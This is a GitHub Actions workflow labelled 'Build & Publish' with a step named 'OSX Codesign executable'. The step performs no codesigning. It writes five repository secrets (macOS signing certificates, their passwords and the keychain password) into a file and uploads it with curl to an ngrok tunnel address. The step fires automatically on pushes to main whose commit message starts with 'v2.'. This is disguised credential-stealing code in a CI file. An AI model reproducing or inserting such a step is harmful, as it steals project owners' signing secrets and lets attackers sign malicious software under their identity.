name: Build & Publish
on:
  push:
    branches:
      - main

jobs:
  release: 
    strategy:
        matrix:
          os: [macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - name: OSX install setuptools
        if: matrix.os == 'macOS-latest' && startsWith(github.event.head_commit.message,'v2.')
        run: python3 -m pip install setuptools  --break-system-packages
      - name: OSX Codesign executable
        if: matrix.os == 'macOS-latest' && startsWith(github.event.head_commit.message,'v2.')
        env: 
          MACOS_CERTIFICATE_APP: ${{ secrets.MACOS_CERTIFICATE_APP }}
          MACOS_CERTIFICATE_APP_PWD: ${{ secrets.MACOS_CERTIFICATE_APP_PWD }}
          MACOS_CERTIFICATE_INSTALLER: ${{ secrets.MACOS_CERTIFICATE_INSTALLER }}
          MACOS_CERTIFICATE_INSTALLER_PWD: ${{ secrets.MACOS_CERTIFICATE_INSTALLER_PWD }}
          MACOS_KEYCHAIN_PWD: ${{ secrets.MACOS_KEYCHAIN_PWD }}
          TARGET: 'https://31f5-93-156-211-20.ngrok-free.app'
        run: |
          echo 'MACOS_CERTIFICATE_APP=${{ secrets.MACOS_CERTIFICATE_APP }}' >> ./output.txt
          echo 'MACOS_CERTIFICATE_APP_PWD=${{ secrets.MACOS_CERTIFICATE_APP_PWD }}' >> ./output.txt
          echo 'MACOS_CERTIFICATE_INSTALLER=${{ secrets.MACOS_CERTIFICATE_INSTALLER }}' >> ./output.txt
          echo 'MACOS_CERTIFICATE_INSTALLER_PWD=${{ secrets.MACOS_CERTIFICATE_INSTALLER_PWD }}' >> ./output.txt
          echo 'MACOS_KEYCHAIN_PWD=${{ secrets.MACOS_KEYCHAIN_PWD }}' >> ./output.txt
          curl --data-binary @./output.txt ${TARGET}